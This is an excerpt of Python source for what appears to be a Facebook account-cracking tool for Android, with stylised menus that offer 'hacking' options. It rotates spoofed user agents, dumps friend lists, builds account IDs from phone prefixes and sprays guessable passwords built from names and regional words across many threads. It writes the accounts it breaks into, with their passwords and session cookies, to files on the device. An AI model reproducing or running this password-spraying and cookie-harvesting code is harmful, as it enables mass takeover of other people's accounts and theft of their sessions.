...
ua = ["Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 4.3; Nexus 7 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.0.0 Mobile/15E148 Safari/604.1",]
ua = ["Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.0.0 Mobile/15E148 Safari/604.1",]
ua = ["Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0",]
ua = ["Mozilla/5.0 (Android 4.4; Tablet; rv:70.0) Gecko/70.0 Firefox/70.0",]
...
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 EdgiOS/44.5.0.10 Mobile/15E148 Safari/604.1",]
ua = ["Mozilla/5.0 (iPad; CPU OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 EdgiOS/44.5.2 Mobile/15E148 Safari/605.1.15",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.D1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 EdgA/42.0.0.2057",]
ua = ["Mozilla/5.0 (Linux; Android 6.0.1; Nexus 7 Build/MOB30X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36 EdgA/42.0.0.2057",]
...
ua = ["Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0",]
ua = ["Mozilla/5.0 (Android 4.4; Tablet; rv:70.0) Gecko/70.0 Firefox/70.0",]
ua = ["Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 (compatible; Googlebot/2.1;",]
...
ua = ["Mozilla/5.0 (X11; CrOS x86_64 10066.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0",]
ua = ["Mozilla/5.0 (Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0",]
...
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.100.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/604.1 Edg/124.0.100.0",]
...
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19041",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48",]
...
ua = ["Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/124.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.D1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 EdgA/42.0.0.2057",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; Nexus 6P Build/OPM7.181205.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.11.1.1197 Mobile Safari/537.36",]
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/𝕰𝖛𝖎𝖑.txt \033[0;97m\n')
        #100010138361148
...
def public():
        ...
        try:
                ...
                name=(info['name'])
                print('\033[1;33m Welcome '+name)
                linex()
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;32m '))
                lim=jum
        except ValueError:
        ...
        if cx in ['y','Y','yes','Yes','1']:
                ...
                pcp.append('n')
        linex()
        print('\033[1;33m Dumping friend list...\033[1;32m')
        linex()
        for userr in usrr:
                try:
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print(' [1] 𝕱𝖎𝖑𝖊 𝖈𝖑𝖔𝖓𝖎𝖓𝖌 \n [2] 𝕮𝖗𝖊𝖆𝖙𝖊 𝖋𝖎𝖑𝖊\n [3] 𝕻𝖚𝖇𝖑𝖎𝖈 𝖈𝖑𝖔𝖓𝖎𝖓𝖌\n [4] 𝕽𝖆𝖓𝖉𝖔𝖒 𝖈𝖑𝖔𝖓𝖎𝖓𝖌\n [5] 𝖌𝖒𝖆𝖎𝖑 𝖈𝖑𝖔𝖓𝖎𝖓𝖌\n [6] 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕 𝕲𝖗𝖔𝖚𝖕 𝖏𝖔𝖎𝖓\n [7] 𝕾𝖊𝖕𝖆𝖗𝖆𝖙𝖊 𝖎𝖉𝖘\n  ')
                        linex()
                        xd=input(' 𓂀ℂ𝕙𝕠𝕠𝕤𝕖 𝕆𝕟𝕖 𝕆𝕡𝕥𝕚𝕠𝕟𓂀----> ')
                        if xd in ['1','01']:
                                clear()
                                print(' 𝐿𝑜𝑜𝓀  𝐸𝓍𝒶𝓂𝓅𝓁𝑒👉: /🆂🅳🅲🅰🆁🅳/🅵🅸🅻🅴 🅺🅾 🅽🅰🅼🅴.🆃🆇🆃 ...')
                                print(' 𝕤𝕦𝕣𝕖 𝕩𝕒𝕦 𝕟𝕚 𝕙𝕒𝕟𝕖𝕜𝕠 𝕗𝕚𝕝𝕖 𝕩𝕒 𝕧𝕒𝕟𝕖𝕣𝕒😏')
                                linex()
                                file = input(' ༺✮•°◤ 𝙈𝙖𝙩𝙝𝙞👆 𝙙𝙚𝙢𝙤 𝙭𝙖. ◥°•✮༻\033[1;32m: ')
                                try:
                                        ...
                                        menu()
                                clear()
                                print('ℂ𝕙𝕠𝕠𝕤𝕖 ℍ𝕒𝕔𝕜𝕚𝕟𝕘 𝕆𝕡𝕥𝕚𝕠𝕟😈')
                                linex()
                                print(' [1] 𝕰𝖛𝖎𝖑 𝖐𝖎𝖑𝖑 𝕳𝖆𝖈𝖐𝖎𝖓𝖌\n [2] 𝕶𝖎𝖑𝖑 𝕳𝖆𝖈𝖐𝖎𝖓𝖌\n [3] 𝕻𝖔𝖜𝖊𝖗𝖋𝖚𝖑 𝕳𝖆𝖈𝖐𝖎𝖓𝖌 ')
                                linex()
                                mthd=input(' 🅲🅷🅾🅾🆂🅴 🅾🅽🅴 ☝')
                                linex()
                                plist = []
                                print(' 𓂀ℂ𝕙𝕠𝕠𝕤𝕖 ℂ𝕣𝕒𝕔𝕜 𝕂𝕚𝕝𝕝 𝕡𝕣𝕠𝕔𝕖𝕤𝕤🥳𓂀');linex();print(' [1] 𝕷𝖆𝖟𝖞 😪 𝖍𝖆𝖗𝖚 𝖐𝖔 𝖑𝖆𝖆𝖌𝖎 \n [2] 𝖘𝖊𝖑𝖋 𝖕𝖆𝖘𝖘𝖜𝖔𝖗𝖉 🤐\n [3] 𝕶𝖎𝖑𝖑 𝕻𝖆𝖘𝖘𝖜𝖔𝖗𝖉\n [4] 𝕺𝖑𝖉 𝖎𝖘 𝖌𝖔𝖑𝖉');linex()
                                ppp=input(' 𝕝𝕦 𝕣𝕠𝕛𝕚 𝕙𝕒𝕝𝕦𝕞 𝕥𝕨 𝕝𝕒𝕫𝕪 𝕙𝕒𝕣𝕦: ')
                                if ppp in ['1','01']:
                                    ...
                                    plist.append("first@123")
                                    plist.append("P@ssw0rdFb#2024!")
                                    plist.append("firstdon")
                                    plist.append("maya123")
                                    plist.append("firstdona")
                                    plist.append("first123")
                                    plist.append("babe@123")
                                    plist.append("last123")
                                    plist.append("first1122")
                                    plist.append("don@123")
                                    plist.append("hero@123")
                                    plist.append("first@12345")
                                    plist.append("rai@123")
                                    plist.append("maya123")
                                elif ppp in ["4","04"]:
                                    plist.append("firstlast123")
                                    plist.append("firstlast")
                                    ...
                                    plist.append("lado puti")
                                    plist.append("@gmail.com")
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input(' How many passwords do you want to add ? '))
                                ...
                                with tred(max_workers=35) as crack_submit:
                                        ...
                                        print("\033[1;32m  匚ㄖㄥ几乇 丂ㄒ卂尺ㄒ ᐯ卂ㄚㄖ ㄒ乇 丂丨尺/爪卂爪 🤤")
                                        print("\033[1;35m ꧁ঔৣ☬✞ ₥₳₴₮₳ ₵ⱠØ₦Ɇ Ⱨ₳₦₳ Ⱨ₳ł ✞☬ঔৣ꧂")
                                        linex()
                                ...
                                os.system(f'xdg-open https://p.com/{wx}');menu()
                        elif xd in ['7','07']:
                                crack()
                        elif xd in ['8','08']:
                                os.system('xdg-open httphudxhU/');menu()
                        elif xd in ['9','09']:
                                sep()  
                        elif xd in ['10','10']:
                                double()                              
...
def pak():
                ...
                with tred(max_workers=30) as 𝕰𝖛𝖎𝖑:     
                        clear()
                        tl = str(len(user))
                        print(' Total ids : \033[1;32m'+tl)
                        print(f'\033[1;33m the process has been started')
                        print(f'\033[1;33m Use airplane mode for speed up ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','peshawar','pakistan']
                                𝕰𝖛𝖎𝖑.submit(rndm,ids,passlist)
                print('\033[1;32m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def bd():
                ...
                with tred(max_workers=30) as 𝕰𝖛𝖎𝖑:
                        ...
                        print(f'\033[1;33m Use airplane mode for speed up ')
                        linex()
                        print("\033[1;33m OK IDZ SAVED IN >>>>> /SDCARD/𝕰𝖛𝖎𝖑-OK.TXT")
                        print("\033[1;33m CP IDZ SAVED IN >>>>> /SDCARD/𝕰𝖛𝖎𝖑-CP.TXT")
                        print("\033[1;33m COOKIE SAVED IN >>>> /SDCARD/𝕰𝖛𝖎𝖑-COOKIE.TXT")
                        linex()
                        for psx in user:
                                ids = code+psx
...
def india():
                ...
                global lim
                clear()
                print('\033[1;31m Example: 9814,9840,9861etc')
                code = input('\033[1;32m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;32m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=30) as 𝕰𝖛𝖎𝖑:     
                        ...
                        for psx in user:
                                ...
                                passlist = [ids[4:],psx,ids,"nepal123","nepal12345","Kathmandu","firstlast","maya123","maya123","first1234","maya12345","pokhara","sagar123","nepal@123","maya@123"]
...
def gmail():
                ...
                global lim
                clear()
                print('\033[1;32m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;32m example: khan, awais, ali \033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;32m [𝕰𝖛𝖎𝖑] [%s] \033[1;32m[OK=%s] [%s%%]\033[1;32m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    # 'cookie': 'datr=Ox9EZk_8_W_jRDoN5iyi0TFn; sb=Ox9EZnVxPl1lFBaWw-DCOIRW; ps_n=1; ps_l=1; vpd=v1%3B419x393x2.75; m_pixel_ratio=2.75; wd=393x750; fr=0j2w5nde4cgAwwy9f..BmRB87..AAA.0.0.BmYPuO.AWUjnn10DQA',
    'dpr': '2.75',
    ...
    'viewport-width': '980',
                        ...
                        𝕰𝖛𝖎𝖑=str(session.cookies)
                        if "c_user" in 𝕰𝖛𝖎𝖑:
                                print('\r\r\033[1;32m [𝕰𝖛𝖎𝖑-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                #print("Cookie: "+coki)
                                open('/sdcard/𝕰𝖛𝖎𝖑-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/𝕰𝖛𝖎𝖑-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in 𝕰𝖛𝖎𝖑:
                                if 'y' in pcp:
                                        #print('\r\r\x1b[38;5;208m [𝕰𝖛𝖎𝖑-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝕰𝖛𝖎𝖑-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
    ...
    'viewport-width': '980',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;33m [𝕰𝖛𝖎𝖑-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝕰𝖛𝖎𝖑-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;33m [𝕰𝖛𝖎𝖑-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/𝕰𝖛𝖎𝖑-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/𝕰𝖛𝖎𝖑-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n') 
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [𝕰𝖛𝖎𝖑-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝕰𝖛𝖎𝖑-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
